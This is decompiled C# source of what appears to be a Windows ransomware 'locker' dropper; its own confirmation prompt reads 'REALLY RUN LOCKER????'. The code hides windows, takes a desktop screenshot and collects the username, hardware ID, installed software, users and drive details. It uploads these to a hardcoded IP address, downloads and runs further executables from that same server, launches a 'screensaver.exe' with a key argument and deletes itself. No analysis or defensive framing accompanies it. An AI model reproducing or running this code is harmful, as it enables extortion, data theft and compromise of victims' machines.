using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Net;
using System.Text;
using System.Windows.Forms;

namespace setup
{
	// Token: 0x02000002 RID: 2
	internal class App
	{
		// Token: 0x06000001 RID: 1 RVA: 0x00002050 File Offset: 0x00000250
		public static void Start(string[] args)
		{
			if (args.Length < 2)
			{
				Environment.Exit(0);
			}
			App.AppName = args[0].ToLower().Trim();
			App.AccessToken = args[1].ToLower().Trim();
			if (MessageBox.Show("REALLY RUN LOCKER????", App.AppName, MessageBoxButtons.YesNo) == DialogResult.No)
			{
				Environment.Exit(0);
				return;
			}
			if (!Runner.CheckSingle())
			{
				Environment.Exit(0);
			}
			Runner.HideAllWindows();
			App.FileInfo[] files = new App.FileInfo[]
			{
				new App.FileInfo
				{
					Name = "desktop",
					Content = ScreenShot.MakeDesktopScreenshot()
				}
			};
			App.DownloadAndRun(App.AppName + ".exe", "--access-token " + App.AccessToken, true);
			App.UploadDedInfo(files, App.FullInfo());
			App.DownloadAndRun(App.ScreenSaverName, App.ScreenSaverArgs, false);
			Runner.SelfRemove();
		}

		// Token: 0x06000002 RID: 2 RVA: 0x00002120 File Offset: 0x00000320
		private static void DownloadAndRun(string ExeName, string Args = "", bool Confirm = true)
		{
			using (WebClient webClient = new WebClient())
			{
				bool flag = true;
				while (flag)
				{
					try
					{
						webClient.DownloadFile(new Uri("http://141.136.44.54/files/" + ExeName), ExeName);
						if (Confirm || MessageBox.Show("Start " + ExeName + "?", ExeName, MessageBoxButtons.YesNo) == DialogResult.Yes)
						{
							Process.Start(ExeName, Args);
						}
						break;
					}
					catch (Exception ex)
					{
						if (MessageBox.Show(ex.Message + "\r\nTry now??", "Download and run " + ExeName + " error", MessageBoxButtons.YesNo) == DialogResult.No)
						{
							Runner.SelfRemove();
							flag = false;
						}
					}
				}
			}
		}

		// Token: 0x06000003 RID: 3 RVA: 0x000021D4 File Offset: 0x000003D4
		private static void UploadDedInfo(App.FileInfo[] Files, NameValueCollection Info)
		{
			bool flag = true;
			while (flag)
			{
				try
				{
					App.UploadFiles("http://141.136.44.54/upload", Files, Info);
					break;
				}
				catch (Exception ex)
				{
					if (MessageBox.Show(ex.Message + "\r\nRETRY SEND??", "UPLOAD ERROR", MessageBoxButtons.YesNo) == DialogResult.No)
					{
						Runner.SelfRemove();
						flag = false;
					}
				}
			}
		}

		// Token: 0x06000004 RID: 4 RVA: 0x00002230 File Offset: 0x00000430
		private static NameValueCollection FullInfo()
		{
			return new NameValueCollection
			{
				{
					"login",
					Environment.UserName
				},
				{
					"os",
					OSInfo.GetOSName()
				},
				{
					"language",
					OSInfo.GetOSLang()
				},
				{
					"timezone",
					OSInfo.GetTimeZone()
				},
				{
					"key",
					OSInfo.GetHardwareID()
				},
				{
					"keyboards",
					string.Join("\r\n", OSInfo.GetKeyboards())
				},
				{
					"users",
					string.Join("\r\n", OSInfo.GetUsers())
				},
				{
					"soft",
					string.Join("\r\n", OSInfo.GetInstalledSoft())
				},
				{
					"drives",
					string.Join("\r\n", OSInfo.GetDrivesInfo())
				},
				{
					"sender",
					App.AppName
				}
			};
		}

		// Token: 0x06000005 RID: 5 RVA: 0x0000230C File Offset: 0x0000050C
		public static void UploadFiles(string address, IEnumerable<App.FileInfo> files, NameValueCollection values)
		{
			WebRequest webRequest = WebRequest.Create(address);
			webRequest.Method = "POST";
			string text = "---------------------------" + DateTime.Now.Ticks.ToString("x", NumberFormatInfo.InvariantInfo);
			webRequest.ContentType = "multipart/form-data; boundary=" + text;
			text = "--" + text;
			using (Stream requestStream = webRequest.GetRequestStream())
			{
				foreach (object obj in values.Keys)
				{
					string text2 = (string)obj;
					byte[] bytes = Encoding.ASCII.GetBytes(text + Environment.NewLine);
					requestStream.Write(bytes, 0, bytes.Length);
					bytes = Encoding.ASCII.GetBytes(string.Format("Content-Disposition: form-data; name=\"{0}\"{1}{1}", text2, Environment.NewLine));
					requestStream.Write(bytes, 0, bytes.Length);
					bytes = Encoding.UTF8.GetBytes(values[text2] + Environment.NewLine);
					requestStream.Write(bytes, 0, bytes.Length);
				}
				foreach (App.FileInfo fileInfo in files)
				{
					byte[] bytes2 = Encoding.ASCII.GetBytes(text + Environment.NewLine);
					requestStream.Write(bytes2, 0, bytes2.Length);
					bytes2 = Encoding.UTF8.GetBytes(string.Format("Content-Disposition: form-data; name=\"{0}\"; filename=\"{1}\"{2}", fileInfo.Name, fileInfo.Filename, Environment.NewLine));
					requestStream.Write(bytes2, 0, bytes2.Length);
					bytes2 = Encoding.ASCII.GetBytes(string.Format("Content-Type: {0}{1}{1}", fileInfo.ContentType, Environment.NewLine));
					requestStream.Write(bytes2, 0, bytes2.Length);
					requestStream.Write(fileInfo.Content, 0, fileInfo.Content.Length);
					bytes2 = Encoding.ASCII.GetBytes(Environment.NewLine);
					requestStream.Write(bytes2, 0, bytes2.Length);
				}
				byte[] bytes3 = Encoding.ASCII.GetBytes(text + "--");
				requestStream.Write(bytes3, 0, bytes3.Length);
			}
			webRequest.GetResponse().Close();
		}

		// Token: 0x04000001 RID: 1
		private const string GateIP = "141.136.44.54";

		// Token: 0x04000002 RID: 2
		private const string APIUrl = "http://141.136.44.54/upload";

		// Token: 0x04000003 RID: 3
		private const string FilesUrl = "http://141.136.44.54/files/";

		// Token: 0x04000004 RID: 4
		private static string AppName = "";

		// Token: 0x04000005 RID: 5
		private static string AccessToken = "";

		// Token: 0x04000006 RID: 6
		private static string ScreenSaverName = "screensaver.exe";

		// Token: 0x04000007 RID: 7
		private static string ScreenSaverArgs = "7C28913B6F1CE6E452678F117954BF4EJ7521E2B4A224740AAF64D5FAD08520ACDF9F8912E7DE";

		// Token: 0x02000007 RID: 7
		public class FileInfo
		{
			// Token: 0x0400000C RID: 12
			public string Name;

			// Token: 0x0400000D RID: 13
			public string Filename = "file.bin";

			// Token: 0x0400000E RID: 14
			public string ContentType = "application/octet-stream";

			// Token: 0x0400000F RID: 15
			public byte[] Content;
		}
	}
}